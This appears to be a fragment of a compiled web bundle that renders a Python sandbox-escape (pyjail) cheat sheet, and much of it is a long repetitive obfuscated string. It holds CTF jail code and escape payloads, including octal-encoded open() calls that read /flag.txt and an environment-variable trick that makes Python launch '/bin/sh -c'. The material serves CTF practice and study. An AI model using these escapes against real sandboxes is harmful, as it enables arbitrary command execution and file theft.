class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">~</span>_</code>',Vu,Da,nt,C_,$u,ja,Ke,Ze,L_,Ju,Na,Z2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-m]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,Ku,Pa,Xe,Qe,T_,Zu,Ha,X2=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"op\\145n(*op\\145n('/\\146\\154\\141\\147.txt'))"</span><span class="token punctuation">)</span></code>`,Xu,Ua,at,A_,Qu,Ma,sc,nc,O_,sr,Sa,Q2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[n-z]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,nr,Ba,ac,pc,F_,ar,qa,s1=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"\\157\\160e\\156(*\\157\\160e\\156('/flag.\\164\\170\\164'))"</span><span class="token punctuation">)</span></code>`,pr,za,pt,R_,tr,h,tc,M,I_,D_,oc,S,j_,N_,ec,B,P_;return{c(){d=p("blockquote"),v=p("p"),O=k("Notice: This document will be continuously updated."),q=u(),_=p("h2"),m=p("a"),Ya=k("Sinks"),cc=u(),$=p("h3"),Ga=p("a"),ir=k("retrieving builtins"),lc=u(),J=p("pre"),uc=u(),K=p("h3"),Va=p("a"),_r=k("good to know built-in functions and methods"),rc=u(),Z=p("pre"),kc=u(),X=p("h3"),$a=p("a"),dr=k("subclasses"),ic=u(),Q=p("pre"),_c=u(),ss=p("h3"),Ja=p("a"),fr=k("popular modules"),dc=u(),ns=p("pre"),fc=u(),as=p("h2"),Ka=p("a"),mr=k("Bypasses and payloads"),mc=u(),ps=p("h3"),Za=p("a"),br=k("decorators"),bc=u(),ts=p("pre"),yc=u(),os=p("h3"),Xa=p("a"),yr=k("unicode bypass"),gc=u(),es=p("pre"),wc=u(),cs=p("h3"),Qa=p("a"),gr=k("audithook bypass"),vc=u(),ls=p("pre"),Ec=u(),us=p("pre"),hc=u(),rs=p("h3"),sp=p("a"),wr=k("assigning attributes and variables"),xc=u(),ks=p("pre"),Cc=u(),is=p("pre"),Lc=u(),_s=p("h3"),np=p("a"),vr=k("getting attributes"),Tc=u(),ds=p("pre"),Ac=u(),fs=p("pre"),Oc=u(),ms=p("h3"),ap=p("a"),Er=k("running functions and methods without parenthesis"),Fc=u(),bs=p("pre"),Rc=u(),ys=p("pre"),Ic=u(),gs=p("h3"),pp=p("a"),hr=k("deleting variables"),Dc=u(),ws=p("pre"),jc=u(),vs=p("h2"),tp=p("a"),xr=k("General stuff"),Nc=u(),Es=p("h3"),op=p("a"),Cr=k("environment variables"),Pc=u(),F=p("ul"),ut=p("li"),R=p("a"),Lr=k("https://www.elttam.com/blog/env/#python"),Tr=u(),b=p("li"),rt=p("code"),Ar=k("PYTHONINSPECT"),Or=k(", "),kt=p("code"),Fr=k("PYTHONHOME"),Rr=k(", "),it=p("code"),Ir=k("PYTHONPATH"),Dr=k(", "),_t=p("code"),jr=k("PYTHONWARNINGS"),Nr=k(", "),dt=p("code"),Pr=k("BROWSER"),z=p("ul"),ft=p("li"),mt=p("code"),Hr=k('help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")'),Ur=u(),hs=p("li"),bt=p("code"),Mr=k(`help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))`),Sr=k(" - ref: "),I=p("a"),Br=k("https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),Hc=u(),xs=p("h3"),ep=p("a"),qr=k("magic methods"),Uc=u(),Cs=p("ul"),yt=p("li"),D=p("a"),zr=k("https://rszalski.github.io/magicmethods/#appendix1"),Mc=u(),Ls=p("h3"),cp=p("a"),Wr=k("help"),Sc=u(),w=p("ul"),gt=p("li"),Yr=k("use of pager (ie. less) to escape sandbox"),Gr=u(),lp=p("li"),Vr=k("list modules by entering "),wt=p("code"),$r=k("modules"),Jr=u(),up=p("li"),Kr=k("load modules by entering module names:"),y=p("ul"),rp=p("li"),vt=p("code"),Zr=k("__main__"),Xr=k(" - should already be loaded, help page shown if so"),Qr=u(),kp=p("li"),Et=p("code"),sk=k("pdb"),nk=k(" - similar to importing pdb"),ak=u(),ip=p("li"),ht=p("code"),pk=k("antigravity"),tk=k(" - similar to importing antigravity"),ok=u(),E=p("li"),xt=p("code"),ek=k("PROGRAM_NAME"),ck=k(" / "),Ct=p("code"),lk=k("jail"),uk=k(" / "),Lt=p("code"),rk=k("app"),kk=k(" - similar to importing and rerunning program if not wrapped in "),Tt=p("code"),ik=k('if __name__ == "__main__":'),_k=u(),_p=p("li"),dk=k("note: loading modules would also add related imported classes to "),At=p("code"),fk=k("object.__subclasses__()"),mk=u(),dp=p("li"),bk=k("see "),j=p("a"),yk=k("SECCON Beginners CTF 2022: hitchhike4b"),Bc=u(),Ts=p("pre"),qc=u(),As=p("h3"),fp=p("a"),gk=k("format string"),zc=u(),Os=p("pre"),Wc=u(),Fs=p("h3"),mp=p("a"),wk=k("stable payloads"),Yc=u(),Rs=p("pre"),Gc=u(),Is=p("h3"),bp=p("a"),vk=k("finding sinks from modules"),Vc=u(),N=p("ul"),yp=p("li"),P=p("a"),Ek=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),gp=p("ul"),Ot=p("li"),Ft=p("code"),hk=k('__import__("ctypes")._aix.environ'),xk=u(),wp=p("li"),H=p("a"),Ck=k("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),vp=p("ul"),Rt=p("li"),It=p("code"),Lk=k('__import__("_aix_support").sys'),$c=u(),Ds=p("h3"),Ep=p("a"),Tk=k("generic classes / bullet points"),Jc=u(),f=p("ul"),U=p("li"),Dt=p("code"),Ak=k('f"{65:c}"'),Ok=k(" can format an int to char (equivalent to "),jt=p("code"),Fk=k('"%c" % 65 == chr(65) == "A"'),Rk=k(")"),hp=p("ul"),xp=p("li"),Nt=p("code"),Ik=k('"".encode().fromhex("41").decode()'),Dk=k(" parses hex into string"),jk=u(),Cp=p("li"),Pt=p("code"),Nk=k("type"),W=p("ul"),Ht=p("li"),Ut=p("code"),Pk=k("[].__class__.__class__"),Hk=u(),Mt=p("li"),St=p("code"),Uk=k('"".__class__.__class__'),Mk=u(),Lp=p("li"),Bt=p("code"),Sk=k("object"),C=p("ul"),qt=p("li"),zt=p("code"),Bk=k("[].__class__.__mro__[1]"),qk=u(),Wt=p("li"),Yt=p("code"),zk=k("[].__class__.__bases__[0]"),Wk=u(),Gt=p("li"),Vt=p("code"),Yk=k("[].__class__.__base__"),Gk=u(),Tp=p("li"),$t=p("code"),Vk=k("str"),L=p("ul"),Jt=p("li"),Kt=p("code"),$k=k('"".__class__'),Jk=u(),Zt=p("li"),Xt=p("code"),Kk=k("[].__doc__.__class__"),Zk=u(),Qt=p("li"),so=p("code"),Xk=k("[].__class__.__module__.__class__"),Qk=u(),Ap=p("li"),no=p("code"),si=k("tuple"),Op=p("ul"),ao=p("li"),po=p("code"),ni=k("[].__class__.__bases__.__class__"),ai=u(),Fp=p("li"),to=p("code"),pi=k("dict"),T=p("ul"),oo=p("li"),eo=p("code"),ti=k("{}.__class__"),oi=u(),co=p("li"),lo=p("code"),ei=k("obj.__dict__.__class__"),ci=u(),uo=p("li"),ro=p("code"),li=k('"".__class__.__dict__.copy().__class__'),ui=u(),js=p("li"),ko=p("code"),ri=k("class instances"),ki=k(":"),Y=p("ul"),Rp=p("li"),io=p("code"),ii=k("class cobj:..."),Ip=p("ul"),_o=p("li"),fo=p("code"),_i=k("obj = cobj()"),di=u(),Dp=p("li"),mo=p("code"),fi=k('type("cobj", (object,), {})()'),jp=p("ul"),bo=p("li"),yo=p("code"),mi=k('[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()'),Kc=u(),Ns=p("h2"),Np=p("a"),bi=k("CTF"),Zc=u(),Ps=p("h3"),go=p("a"),Xc=u(),Hs=p("ul"),wo=p("li"),vo=p("code"),yi=k("jail.py"),Qc=u(),Us=p("pre"),sl=u(),Ms=p("h3"),Pp=p("a"),gi=k("SECCON CTF 13: 